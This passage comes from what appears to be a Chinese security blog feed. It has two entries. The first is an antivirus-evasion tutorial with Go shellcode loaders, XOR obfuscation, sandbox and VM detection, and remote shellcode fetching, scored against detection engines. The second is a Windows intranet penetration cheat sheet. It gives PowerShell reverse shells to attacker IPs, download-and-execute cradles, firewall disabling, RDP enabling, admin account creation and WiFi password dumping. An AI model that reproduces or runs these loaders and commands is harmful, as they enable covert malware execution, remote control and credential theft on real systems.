class="line">syscall.Exit(0)</span><br><span class="line">&#125;</span><br><span class="line">_, _, err &#x3D; RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&amp;shellcode[0])), uintptr(len(shellcode)))</span><br><span class="line">if err !&#x3D; nil &amp;&amp; err.Error() !&#x3D; &quot;The operation completed successfully.&quot; &#123;</span><br><span class="line">syscall.Exit(0)</span><br><span class="line">&#125;</span><br><span class="line">syscall.Syscall(addr, 0, 0, 0, 0)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最原始版本,被杀成哈批，但即使这样360也杀不出来，可以看出绕过360有手就行</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210818180146046.png" alt="image-20210818180146046"></p><h2 id="简单XOR"><a href="#简单XOR" class="headerlink" title="简单XOR"></a>简单XOR</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xor模块（获得xor后的shellcode）</span><br><span class="line">for i:&#x3D;0;i&lt;len(shellcode);i++&#123;</span><br><span class="line">fmt.Print(&quot;0x&quot;,strconv.FormatInt(int64(shellcode[i]^123),16),&quot;,&quot;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xor_shellcode:&#x3D;[]byte&#123;xored_shellcode&#125;</span><br><span class="line">var shellcode []byte</span><br><span class="line">for i:&#x3D;0;i&lt;len(xor_shellcode);i++&#123;</span><br><span class="line">shellcode&#x3D;append(shellcode,xor_shellcode[i]^123)</span><br><span class="line">&#125;</span><br><span class="line">addr,_,err:&#x3D;VirtualAlloc.Call(0,uintptr(len(shellcode)),MEM_COMMIT, PAGE_EXECUTE_READWRITE )</span><br><span class="line">if err !&#x3D; nil &amp;&amp; err.Error() !&#x3D; &quot;The operation completed successfully.&quot; &#123;</span><br><span class="line">syscall.Exit(0)</span><br><span class="line">&#125;</span><br><span class="line">_, _, err &#x3D; RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&amp;shellcode[0])), uintptr(len(shellcode)))</span><br><span class="line">if err !&#x3D; nil &amp;&amp; err.Error() !&#x3D; &quot;The operation completed successfully.&quot; &#123;</span><br><span class="line">syscall.Exit(0)</span><br><span class="line">&#125;</span><br><span class="line">syscall.Syscall(addr, 0, 0, 0, 0)</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210818185018219.png" alt="image-20210818185018219"></p><p>好了点，但是如果加上无框启动，还是会被杀成哈批</p><h2 id="沙盒-amp-虚拟机检测"><a href="#沙盒-amp-虚拟机检测" class="headerlink" title="沙盒&amp;虚拟机检测"></a>沙盒&amp;虚拟机检测</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">imoprt&#123;&quot;github.com&#x2F;shirou&#x2F;gopsutil&#x2F;host&quot;</span><br><span class="line">&quot;github.com&#x2F;shirou&#x2F;gopsutil&#x2F;mem&quot;</span><br><span class="line">&quot;github.com&#x2F;shirou&#x2F;gopsutil&#x2F;disk&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func CheckTime() bool&#123;</span><br><span class="line">timeBoot, _ :&#x3D; host.BootTime()</span><br><span class="line">t :&#x3D; time.Unix(int64(timeBoot), 0)</span><br><span class="line">timeNow:&#x3D;time.Now()</span><br><span class="line">ts:&#x3D;timeNow.Sub(t)</span><br><span class="line">if ts.Minutes()&lt;12&#123;</span><br><span class="line">return false</span><br><span class="line">&#125;else&#123;</span><br><span class="line">return true</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func CheckName() bool&#123;</span><br><span class="line">files, _ :&#x3D; ioutil.ReadDir(&quot;.&#x2F;&quot;)</span><br><span class="line">for _, f :&#x3D; range files &#123;</span><br><span class="line">if f.Name()&#x3D;&#x3D;&quot;ActiveX.exe&quot;&#123;</span><br><span class="line">return true</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return false</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func CheckSystem() bool&#123;</span><br><span class="line">info1,_:&#x3D;mem.SwapMemory()</span><br><span class="line">info2,_:&#x3D;mem.VirtualMemory()</span><br><span class="line">disk,_:&#x3D;disk.Usage(&quot;c:&quot;)</span><br><span class="line">if(runtime.NumCPU()&lt;2&amp;&amp;info1.Total&lt;2147483648&amp;&amp;info2.Total&lt;2147483648&amp;&amp;disk.Total&lt;21474836480)&#123;</span><br><span class="line">return false</span><br><span class="line">&#125;</span><br><span class="line">return true</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210818192335970.png" alt="image-20210818192335970"></p><p>用它和XOR打组合拳效果将就，用了无窗启动后有7个查出来</p><h3 id="虚拟机：敏感文件检测"><a href="#虚拟机：敏感文件检测" class="headerlink" title="虚拟机：敏感文件检测"></a>虚拟机：敏感文件检测</h3><p>这个会被defender拦，不必要的话不用这个</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">func PathExists(path string) (bool, error) &#123; &#x2F;&#x2F;判断文件是否存在</span><br><span class="line">_, err :&#x3D; os.Stat(path)</span><br><span class="line">if err &#x3D;&#x3D; nil &#123;</span><br><span class="line">return true, nil</span><br><span class="line">&#125;</span><br><span class="line">if os.IsNotExist(err) &#123;</span><br><span class="line">return false, nil</span><br><span class="line">&#125;</span><br><span class="line">return false, err</span><br><span class="line">&#125;</span><br><span class="line">func fack(path string) &#123; &#x2F;&#x2F;判断虚拟机关键文件是否存在</span><br><span class="line">b, _ :&#x3D; PathExists(path)</span><br><span class="line">if b &#123;</span><br><span class="line">fmt.Printf(&quot;当前是虚拟机环境，别分析了，哥。&quot;)</span><br><span class="line">os.Exit(1) &#x2F;&#x2F;如果是虚拟机就退出当前进程</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">func check() &#123;</span><br><span class="line">fack(&quot;C:\\windows\\System32\\Drivers\\Vmmouse.sys&quot;)</span><br><span class="line">fack(&quot;C:\\windows\\System32\\Drivers\\vmtray.dll&quot;)</span><br><span class="line">fack(&quot;C:\\windows\\System32\\Drivers\\VMToolsHook.dll&quot;)</span><br><span class="line">fack(&quot;C:\\windows\\System32\\Drivers\\vmmousever.dll&quot;)</span><br><span class="line">fack(&quot;C:\\windows\\System32\\Drivers\\vmhgfs.dll&quot;)</span><br><span class="line">fack(&quot;C:\\windows\\System32\\Drivers\\vmGuestLib.dll&quot;)</span><br><span class="line">fack(&quot;C:\\windows\\System32\\Drivers\\VBoxMouse.sys&quot;)</span><br><span class="line">fack(&quot;C:\\windows\\System32\\Drivers\\VBoxGuest.sys&quot;)</span><br><span class="line">fack(&quot;C:\\windows\\System32\\Drivers\\VBoxSF.sys&quot;)</span><br><span class="line">fack(&quot;C:\\windows\\System32\\Drivers\\VBoxVideo.sys&quot;)</span><br><span class="line">fack(&quot;C:\\windows\\System32\\vboxdisp.dll&quot;)</span><br><span class="line">fack(&quot;C:\\windows\\System32\\vboxhook.dll&quot;)</span><br><span class="line">fack(&quot;C:\\windows\\System32\\vboxoglerrorspu.dll&quot;)</span><br><span class="line">fack(&quot;C:\\windows\\System32\\vboxoglpassthroughspu.dll&quot;)</span><br><span class="line">fack(&quot;C:\\windows\\System32\\vboxservice.exe&quot;)</span><br><span class="line">fack(&quot;C:\\windows\\System32\\vboxtray.exe&quot;)</span><br><span class="line">fack(&quot;C:\\windows\\System32\\VBoxControl.exe&quot;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="远程读shellcode"><a href="#远程读shellcode" class="headerlink" title="远程读shellcode"></a>远程读shellcode</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Url,err:&#x3D;url.Parse(&quot;https:&#x2F;&#x2F;pastebin.com&#x2F;aa&quot;)</span><br><span class="line">if err!&#x3D;nil&#123;</span><br><span class="line">panic(&quot;error&quot;)</span><br><span class="line">&#125;</span><br><span class="line">client:&#x3D;http.Client&#123;&#125;</span><br><span class="line">req,_:&#x3D;http.NewRequest(&quot;GET&quot;,Url.String(),nil)</span><br><span class="line">req.Header.Add(&quot;User-Agent&quot;,&quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;90.0.4430.93 Safari&#x2F;537.36&quot;)</span><br><span class="line">req.Header.Add(&quot;Cookie&quot;,&quot;SUB&#x3D;_2 SUBP&#x3D;00&quot;)</span><br><span class="line">resp,_:&#x3D;client.Do(req)</span><br><span class="line">body,_:&#x3D;ioutil.ReadAll(resp.Body)  &#x2F;&#x2F;string形式获取了页面内容,以上代码为主体部分</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;通过一系列正则匹配,字符串截取等方法从页面中得到shellcode(页面中我的shellcode是这样的rngrngfc,48,....,aalgdlgd)</span><br><span class="line">re:&#x3D;regexp.MustCompile(&#96;rngrng.*lgdlgd&#96;)</span><br><span class="line">match:&#x3D;re.FindString(string(body))</span><br><span class="line">match&#x3D;match[6:len(match)-6]</span><br><span class="line">return match</span><br></pre></td></tr></table></figure><p>但是拖下来的shellcode是string格式，我们需要把他转为[]byte</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">func aa(encodes string) []byte&#123;</span><br><span class="line">var xor_shellcode []byte</span><br><span class="line">spi:&#x3D;&quot;,&quot;</span><br><span class="line">enc:&#x3D;strings.Split(encodes,spi)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i,_ :&#x3D;range enc&#123;</span><br><span class="line">tmps,_:&#x3D;hex.DecodeString(enc[i])</span><br><span class="line">if(len(tmps)&gt;0) &#123;</span><br><span class="line">xor_shellcode &#x3D; append(xor_shellcode, tmps[0])</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return xor_shellcode</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>远程+XOR+沙箱 反而被杀的更多…看来这个HTTP函数被抓的很紧，还被360杀出来了</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210818233352655.png" alt="image-20210818233352655"></p><h2 id="读取文件中的SHELLCODE"><a href="#读取文件中的SHELLCODE" class="headerlink" title="读取文件中的SHELLCODE"></a>读取文件中的SHELLCODE</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var sc []byte</span><br><span class="line">bytes,_:&#x3D;ioutil.ReadFile(&quot;C:\\Users\\xx\\Desktop\\sc.txt&quot;)</span><br><span class="line">tmp:&#x3D;strings.Split(string(bytes),&quot;,&quot;)</span><br><span class="line">for i,_ :&#x3D;range tmp&#123;</span><br><span class="line">tmps,_:&#x3D;hex.DecodeString(tmp[i])</span><br><span class="line">if(len(tmps)&gt;0) &#123;</span><br><span class="line">sc &#x3D; append(sc, tmps[0])</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210819212634402.png" alt="image-20210819212634402"></p><p>可以</p><h2 id="文件释放"><a href="#文件释放" class="headerlink" title="文件释放"></a>文件释放</h2><p>在我们木马运行时可以释放一个正常文件并运行，达到DLL劫持或者迷惑视听的作用。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获取文件内容</span><br><span class="line">file,_:&#x3D;os.Open(&quot;E:\\tools\\shell\\cobaltstrike4.3\\cobaltstrike.exe&quot;)</span><br><span class="line">fi,_:&#x3D;file.Stat()</span><br><span class="line">size:&#x3D;fi.Size()</span><br><span class="line">data :&#x3D; make([]byte, size)</span><br><span class="line">file.Read(data)</span><br><span class="line">for _,i:&#x3D;range data&#123;</span><br><span class="line">fmt.Print(strconv.Itoa(int(i))+&quot;,&quot;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;前面的话:”免杀一般都是靠组合拳”&lt;/p&gt;
&lt;h1 id=&quot;EXE&quot;&gt;&lt;a href=&quot;#EXE&quot; class=&quot;headerlink&quot; title=&quot;EXE&quot;&gt;&lt;/a&gt;EXE&lt;/h1&gt;&lt;h3 id=&quot;加壳&quot;&gt;&lt;a href=&quot;#加壳&quot; class=&quot;headerlink&quot;</summary>
      
    
    
    
    
    <category term="系统相关与免杀" scheme="http://const27.com/tags/%E7%B3%BB%E7%BB%9F%E7%9B%B8%E5%85%B3%E4%B8%8E%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>Windows内网渗透常用命令总汇</title>
    <link href="http://const27.com/2021/09/03/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/"/>
    <id>http://const27.com/2021/09/03/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/</id>
    <published>2021-09-03T13:07:23.349Z</published>
    <updated>2021-09-03T13:18:16.804Z</updated>
    
    <content type="html"><![CDATA[<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>前几天面试的时候被师傅问到了这个问题，当时不是很会，现在来学学</p><h3 id="查询网络配置信息"><a href="#查询网络配置信息" class="headerlink" title="查询网络配置信息"></a>查询网络配置信息</h3><p>ipconfig /all</p><h3 id="查询本机的服务信息"><a href="#查询本机的服务信息" class="headerlink" title="查询本机的服务信息"></a>查询本机的服务信息</h3><p>wmic service list brief</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210217010533168.png" alt="image-20210217010533168"></p><h3 id="查询系统信息"><a href="#查询系统信息" class="headerlink" title="查询系统信息"></a>查询系统信息</h3><p>systeminfo</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210217010547050.png" alt="image-20210217010547050"></p><h3 id="连接过的WIFI及密码"><a href="#连接过的WIFI及密码" class="headerlink" title="连接过的WIFI及密码"></a>连接过的WIFI及密码</h3><ol><li>for /f “skip=9 tokens=1,2 delims=:” %i in (‘netsh wlan show profiles’) do  @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear</li></ol><h3 id="查询进程列表"><a href="#查询进程列表" class="headerlink" title="查询进程列表"></a>查询进程列表</h3><p>tasklist / wmic process list brief</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210217010556587.png" alt="image-20210217010556587"></p><h3 id="查看计划任务"><a href="#查看计划任务" class="headerlink" title="查看计划任务"></a>查看计划任务</h3><p>schtasks /query /fo LIST /v 列出计划任务详细信息</p><h3 id="查看主机开机时间"><a href="#查看主机开机时间" class="headerlink" title="查看主机开机时间"></a>查看主机开机时间</h3><p>net statistics workstation</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210217010605609.png" alt="image-20210217010605609"></p><h3 id="用户相关"><a href="#用户相关" class="headerlink" title="用户相关"></a>用户相关</h3><p>net user 查看所有用户<br>net localgroup administrators 获取本地管理员信息</p><h3 id="查看端口列表"><a href="#查看端口列表" class="headerlink" title="查看端口列表"></a>查看端口列表</h3><p>netstat -ano</p><h3 id="查看已打补丁"><a href="#查看已打补丁" class="headerlink" title="查看已打补丁"></a>查看已打补丁</h3><p>wmic qfe get Caption,Description,HotFixID,InstalledOn</p><h3 id="查看共享列表"><a href="#查看共享列表" class="headerlink" title="查看共享列表"></a>查看共享列表</h3><p>net share 查看本机共享列表和可访问的域共享列表<br>wmic share get name,path,status 查找共享列表</p><p><img src="http://www.const27.com/wp-content/uploads/2020/08/image-7.png" alt="img"></p><h3 id="路由表和arp高速缓存表"><a href="#路由表和arp高速缓存表" class="headerlink" title="路由表和arp高速缓存表"></a>路由表和arp高速缓存表</h3><p>route print 路由表<br>arp -a arp高速缓存表</p><h3 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h3><p>netsh firewall set opmode disable 关闭防火墙(Windows Server 2003 以前的版本)</p><p>netsh advfirewall set allprofiles state off 关闭防火墙(Windows Server 2003 以后的版本)</p><p>netsh firewall show config 查看防火墙配置<br>如果上面的命令被弃用，则使用<br>netsh advfirewall firewall show rule name=all</p><p>根据参考，可以使用这个wmic一键获取本机信息<a href="http://www.fuzzysecurity.com/scripts/files/wmic_info.rar">http://www.fuzzysecurity.com/scripts/files/wmic_info.rar</a></p><h3 id="权限查看"><a href="#权限查看" class="headerlink" title="权限查看"></a>权限查看</h3><p>whoami /all 查看自己的详细权限<br>net user xxx /domain 查看域内指定用户的权限</p><h3 id="判断是否存在域"><a href="#判断是否存在域" class="headerlink" title="判断是否存在域"></a>判断是否存在域</h3><p>.net time /domain 若出现以下情况则不存在域</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210217010613612.png" alt="image-20210217010613612"></p><p>若是报错：发生系统错误5，则存在域，但该用户不是域用户</p><p>若是以下情况则说明存在域且已经在域中</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210217010619330.png" alt="image-20210217010619330"></p><h3 id="查看域的名字"><a href="#查看域的名字" class="headerlink" title="查看域的名字"></a>查看域的名字</h3><p>net config workstation</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210217010626107.png" alt="image-20210217010626107"></p><p>nslookup -type=srv _ldap._tcp</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210217010633461.png" alt="image-20210217010633461"></p><p>这个很爽，域控主机名和IP一块弄出来了</p><h3 id="探测域内存活主机"><a href="#探测域内存活主机" class="headerlink" title="探测域内存活主机"></a>探测域内存活主机</h3><p>1.使用工具 nbtscan <a href="http://www.unixwiz.net/tools/nbtscan.html">http://www.unixwiz.net/tools/nbtscan.html</a></p><p>2.查看arp高速缓存表</p><p>arp -a</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/0X@7L2W0IVA%60NKX1AM9JZKB.png" alt="img"></p><p>3.ICMP协议探测（逐个ping）</p><p>这个贼慢，但是不用下载其他应用</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr &quot;TTL&quot;</span><br></pre></td></tr></table></figure><p>4.nmap直接开扫</p><p>5.meterpreter会话中执行 run windows/gather/enum_ad_computers</p><h3 id="扫描域内开放端口"><a href="#扫描域内开放端口" class="headerlink" title="扫描域内开放端口"></a>扫描域内开放端口</h3><p>1.nmap</p><p>nmap 192.168.1.0/24</p><p>2.工具 S扫描器</p><p>3.自写脚本</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#python3 慢的一批</span><br><span class="line">import socket</span><br><span class="line"> </span><br><span class="line">def get_ip_status(ip,port):</span><br><span class="line">    server &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    try:</span><br><span class="line">        server.connect((ip,port))</span><br><span class="line">        print(&#39;&#123;0&#125; port &#123;1&#125; is open&#39;.format(ip, port))</span><br><span class="line">    except Exception as err:</span><br><span class="line">        print(&#39;&#123;0&#125; port &#123;1&#125; is not open&#39;.format(ip,port))</span><br><span class="line">    finally:</span><br><span class="line">        server.close()</span><br><span class="line"> </span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    host &#x3D; &#39;172.16.0.198&#39;</span><br><span class="line">    for port in range(20,100):</span><br><span class="line">        get_ip_status(host,port)</span><br></pre></td></tr></table></figure><h3 id="域内基本信息"><a href="#域内基本信息" class="headerlink" title="域内基本信息"></a>域内基本信息</h3><p>net group “domain computers” /domain 查询所有域成员计算机列表<br>net view /domain:HACHE 查询域内所有主机<br>net accounts /domain 获取域密码信息<br>nltest /domain_trusts 获取域信任信息<br>nltest /DCLIST:hacke 查看域控制器机器名<br>Nslookup -type=SRV_ldap._tcp 查看域控制器的主机名</p><h3 id="域用户信息收集"><a href="#域用户信息收集" class="headerlink" title="域用户信息收集"></a>域用户信息收集</h3><p>net user /domain 向域控制器查询域内用户列表<br>wmic useraccount get /all 获取域内用户详细信息<br>net localgroup administrators 查询本地管理员用户<br>net group “domain admins” /domain 查询域管理员用户<br>net group “Enterprise admins” /domain 查询管理员用户组</p><h3 id="本机wmic查杀软"><a href="#本机wmic查杀软" class="headerlink" title="本机wmic查杀软"></a>本机wmic查杀软</h3><p><code>WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List</code><br>or</p><p>WMIC /namespace:\root\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe</p><h3 id="开3389"><a href="#开3389" class="headerlink" title="开3389"></a>开3389</h3><p>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</p><h3 id="用户增删改查"><a href="#用户增删改查" class="headerlink" title="用户增删改查"></a>用户增删改查</h3><p>net user username password /add 加用户</p><p>net localgroup administrators username /add 添加XX到管理员账户</p><h3 id="一些喜欢用的"><a href="#一些喜欢用的" class="headerlink" title="一些喜欢用的"></a>一些喜欢用的</h3><p>Windows 反弹shell</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;besimorhino&#x2F;powercat&#x2F;master&#x2F;powercat.ps1&#39;); powercat -c 192.168.1.4 -p 9999 -e cmd</span><br><span class="line"></span><br><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;samratashok&#x2F;nishang&#x2F;9a3c747bcf535ef82dc4c5c66aac36db47c2afde&#x2F;Shells&#x2F;Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.203.140 -port 6666</span><br><span class="line"></span><br><span class="line">NISHANG里面抠的</span><br><span class="line">（乞丐版）</span><br><span class="line">$sm&#x3D;(New-Object Net.Sockets.TCPClient(&quot;192.168.254.1&quot;,55555)).GetStream();[byte[]]$bt&#x3D;0..65535|%&#123;0&#125;;while(($i&#x3D;$sm.Read($bt,0,$bt.Length)) -ne 0)&#123;;$d&#x3D;(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st&#x3D;([text.encoding]::ASCII).GetBytes((iex $d 2&gt;&amp;1));$sm.Write($st,0,$st.Length)&#125; </span><br><span class="line">（豪华版）</span><br><span class="line">$client &#x3D; New-Object System.Net.Sockets.TCPClient(&quot;192.168.254.1&quot;,4444);$stream &#x3D; $client.GetStream();[byte[]]$bytes &#x3D; 0..65535|%&#123;0&#125;;while(($i &#x3D; $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data &#x3D; (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback &#x3D; (iex $data 2&gt;&amp;1 | Out-String );$sendback2  &#x3D; $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte &#x3D; ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()</span><br><span class="line"></span><br><span class="line">(cmd专版)</span><br><span class="line">rundll32.exe javascript:&quot;&quot;\..\mshtml,RunHTMLApplication &quot;&quot;;document.write();r&#x3D;new%20ActiveXObject(&quot;&quot;WScript.Shell&quot;&quot;).run(&quot;&quot;powershell -w h -ep bypass &#96;$sm&#x3D;(New-Object Net.Sockets.TCPClient(&#39;$IPAddress&#39;,$Port)).GetStream();[byte[]]&#96;$bt&#x3D;0..65535|%&#123;0&#125;;while((&#96;$i&#x3D;&#96;$sm.Read(&#96;$bt, 0, &#96;$bt.Length)) -ne 0)&#123;;&#96;$d&#x3D;(New-Object Text.ASCIIEncoding).GetString(&#96;$bt,0, &#96;$i);&#96;$sb&#x3D;(iex &#96;$d 2&gt;&amp;1 | Out-String );&#96;$sb2&#x3D;&#96;$sb + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;&#96;$sb&#x3D;([text.encoding]::UTF8).GetBytes(&#96;$sb2);&#96;$sm.Write(&#96;$sb,0,&#96;$sb.Length);&#96;$sm.Flush()&#125;&quot;&quot;,0,true);</span><br></pre></td></tr></table></figure><p>wmic 查杀软</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WMIC &#x2F;namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe</span><br><span class="line"></span><br><span class="line">WMIC &#x2F;Node:localhost &#x2F;Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName &#x2F;Format:List</span><br></pre></td></tr></table></figure><p>开3389</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br><span class="line"></span><br><span class="line">wmic RDTOGGLE WHERE ServerName&#x3D;&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1</span><br><span class="line"></span><br><span class="line">wmic &#x2F;namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName &#x3D;&#39;RDP-Tcp&#39;) call setuserauthenticationrequired 0</span><br></pre></td></tr></table></figure><p>常见杀软进程名<br><a href="https://blog.csdn.net/weixin_39997829/article/details/92666552">https://blog.csdn.net/weixin_39997829/article/details/92666552</a></p><p>cmd下载</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin &#x2F;transfer n http:&#x2F;&#x2F;www.xx.com&#x2F;code.jpg c:\users\sdyp\desktop\ff.jpg</span><br><span class="line"></span><br><span class="line">C:\Temp&gt;certutil.exe -urlcache -split -f &quot;https:&#x2F;&#x2F;hackers.home&#x2F;badcontent.txt&quot; bad.txt</span><br><span class="line">C:\Temp&gt;certutil.exe -decode bad.txt bad.exe</span><br></pre></td></tr></table></figure><p>获取盘符</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic logicaldisk where drivetype&#x3D;3 get deviceid</span><br></pre></td></tr></table></figure><h3 id="ps-cs-上线"><a href="#ps-cs-上线" class="headerlink" title="ps cs 上线"></a>ps cs 上线</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell.exe -c IEX((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;xxx&#x2F;a.ps1&#39;))</span><br><span class="line"></span><br><span class="line">powershell -exec bypass -c &quot;(New-Object Net.WebClient).Proxy.Credentials&#x3D;[Net.CredentialCache]::DefaultNetworkCredentials;iwr(&#39;http:&#x2F;&#x2F;webserver&#x2F;payload.ps1&#39;)|iex&quot;</span><br><span class="line"></span><br><span class="line">powershell -exec bypass -f \\webdavserver\folder\payload.ps1   (smb)</span><br></pre></td></tr></table></figure><h3 id="查看开机自启"><a href="#查看开机自启" class="headerlink" title="查看开机自启"></a>查看开机自启</h3><p>Reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</p><p>Reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</p><h3 id="获取遥测任务"><a href="#获取遥测任务" class="headerlink" title="获取遥测任务"></a>获取遥测任务</h3><p>Reg query <strong>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\Appraiser</strong></p><h3 id="反病毒检测"><a href="#反病毒检测" class="headerlink" title="反病毒检测"></a>反病毒检测</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct</span><br></pre></td></tr></table></figure><p>根据系统的不同，反病毒软件通常会WMI中注册为<code>AntiVirusProduct</code>，保存在<code>root\SecurityCenter</code>或<code>root\SecurityCenter2</code>命名空间中。</p><h3 id="简单的沙盒-amp-虚拟机检测"><a href="#简单的沙盒-amp-虚拟机检测" class="headerlink" title="简单的沙盒&amp;虚拟机检测"></a>简单的沙盒&amp;虚拟机检测</h3><p>沙盒往往是单核且内存小于2g，可以以此为凭据检测</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-WmiObject -Class Win32_ComputerSystem NumberOfLogicalProcessors,TotalPhysicalMemory</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210802132941979.png" alt="image-20210802132941979"></p><p>VMWARE虚拟机如今用的比较多，我们可以通过检测进程中是否存在vmtoolsd以及BIOS属性里是否有VMWARE字样来判断是否是VMWARE虚拟机</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-WmiObject Win32_BIOS -Filter &#39;SerialNumber Like &quot;%VMware%&quot;&#39;</span><br><span class="line">Get-WmiObject Win32_NetworkAdapter -Filter &#39;Manufacturer LIKE &quot;%VMware%&quot; OR Name LIKE &quot;%VMware%&quot;&#39;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;正文&quot;&gt;&lt;a href=&quot;#正文&quot; class=&quot;headerlink&quot; title=&quot;正文&quot;&gt;&lt;/a&gt;正文&lt;/h1&gt;&lt;p&gt;前几天面试的时候被师傅问到了这个问题，当时不是很会，现在来学学&lt;/p&gt;
&lt;h3 id=&quot;查询网络配置信息&quot;&gt;&lt;a href=&quot;#查询网络配置</summary>
      
    
    
    
    
    <category term="内网渗透与权限维持" scheme="http://const27.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%8E%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
    
  </entry>
  
